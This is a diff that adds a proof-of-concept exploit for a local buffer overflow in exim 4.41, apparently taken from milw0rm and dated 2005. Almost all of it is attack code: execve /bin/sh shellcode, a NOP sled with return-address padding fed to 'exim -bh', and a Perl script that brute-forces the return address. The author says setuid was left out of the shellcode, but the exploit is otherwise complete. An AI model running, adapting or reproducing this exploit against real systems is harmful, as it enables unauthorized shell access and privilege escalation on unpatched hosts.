@@ -1,0 +1,62 @@
+/*
+This proof-of-concept demonstrates the existence of the vulnerability
+reported by iDEFENSE (iDEFENSE Security Advisory 01.14.05).
+It has been tested against exim-4.41 under Debian GNU/Linux.
+Note that setuid () is not included in the shellcode to avoid
+script-kidding.
+My RET is 0xbffffae4, but fb.pl can brute-force it for you.
+
+-----------
+Brute Force fb.pl:
+-----------
+
+#!/usr/bin/perl
+
+$cnt = 0xbffffa10;
+
+while (1) {
+   $hex = sprintf ("0x%x", $cnt);
+   $res = system ("./exploit $hex");
+   printf "$hex : $res\n";
+   $cnt += 4;
+}
+
+---------
+exploit.c:
+---------
+*/
+
+#define NOP 0x90
+#define TAMBUF 368
+#define INIC_SH 20
+#include <stdlib.h>
+
+int main (int argc, char **argv) {
+
+   static char shellcode[]=
+   "\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89"
+   "\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e"
+   "\x2f\x73\x68\x58";
+
+   char buffer [TAMBUF + 1];
+   char cadena [TAMBUF + 5];
+   int cont;
+   unsigned long ret = strtoul (argv[1], NULL, 16);
+
+   for (cont = 0; cont < TAMBUF / 4; cont++)
+           *( (long *) buffer + cont) = ret;
+
+   for (cont = 0; cont < strlen (shellcode); cont++)
+           buffer [cont + INIC_SH] = shellcode [cont];
+
+   for (cont = 0; cont < INIC_SH; cont++)
+           buffer [cont] = NOP;
+
+   buffer [TAMBUF] = 0;
+   printf ("RET = 0x%x\n", ret);
+   strcpy (cadena, "::%A");
+   strcat (cadena, buffer);
+       execl ("/usr/sbin/exim", "./exim", "-bh", cadena, (char *) 0);
+}
+
+// milw0rm.com [2005-01-15]
